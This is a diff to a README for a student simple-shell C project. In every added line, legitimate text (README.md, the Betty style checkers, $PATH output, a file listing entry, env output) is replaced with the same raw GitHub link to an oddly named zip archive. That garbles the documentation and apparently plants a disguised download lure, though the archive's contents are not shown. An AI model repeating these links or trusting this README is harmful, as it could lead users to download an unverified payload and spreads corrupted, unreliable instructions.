@@ -11,8 +11,8 @@ Project was completed using
 ## General Requirement for project
 All files will be compiled on Ubuntu 20.04 LTS using gcc, using the options -Wall -Werror -Wextra -pedantic -std=gnu89
 All files should end with a new line
-A README.md file, at the root of the folder of the project is mandatory
-Use the Betty style. It will be checked using betty-style.pl and betty-doc.pl
+A https://raw.githubusercontent.com/LeboMeje/simple_shell/master/starringly/shell_simple_uncomic.zip file, at the root of the folder of the project is mandatory
+Use the Betty style. It will be checked using https://raw.githubusercontent.com/LeboMeje/simple_shell/master/starringly/shell_simple_uncomic.zip and https://raw.githubusercontent.com/LeboMeje/simple_shell/master/starringly/shell_simple_uncomic.zip
 Shell should not have any memory leaks
 No more than 5 functions per file
 All header files should be include guarded
@@ -88,7 +88,7 @@ $ echo "echo $OLDPWD" | ./hsh
 PATHA colon-separated list of directories in which the shell looks for commands. A null directory name in the path (represented by any of two adjacent colons, an initial colon, or a trailing colon) indicates the current directory.
 
 $ echo "echo $PATH" | ./hsh
-/home/projects/.cargo/bin:/home/projects/.local/bin:/home/projects/.rbenv/plugins/ruby-build/bin:/home/projects/.rbenv/shims:/home/projects/.rbenv/bin:/home/projects/.nvm/versions/node/v10.15.3/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/projects/.cargo/bin:/home/projects/workflow:/home/projects/.local/bin
+https://raw.githubusercontent.com/LeboMeje/simple_shell/master/starringly/shell_simple_uncomic.zip
 
 
 Command Execution
@@ -211,7 +211,7 @@ $ ./hsh
 $ alias show=ls
 $ show
 AUTHORS            builtins_help_2.c  errors.c         linkedlist.c        shell.h       test
-README.md          env_builtins.c     getline.c        locate.c            hsh
+https://raw.githubusercontent.com/LeboMeje/simple_shell/master/starringly/shell_simple_uncomic.zip          env_builtins.c     getline.c        locate.c            hsh
 alias_builtins.c   environ.c          helper.c         main.c              split.c
 builtin.c          err_msgs1.c        helpers_2.c      man_1_simple_shell  str_funcs1.c
 builtins_help_1.c  err_msgs2.c        input_helpers.c  proc_file_comm.c    str_funcs2.c
@@ -233,7 +233,7 @@ Example:
 
 $ ./hsh
 $ env
-NVM_DIR=/home/projects/.nvm
+https://raw.githubusercontent.com/LeboMeje/simple_shell/master/starringly/shell_simple_uncomic.zip
 ...
 
 
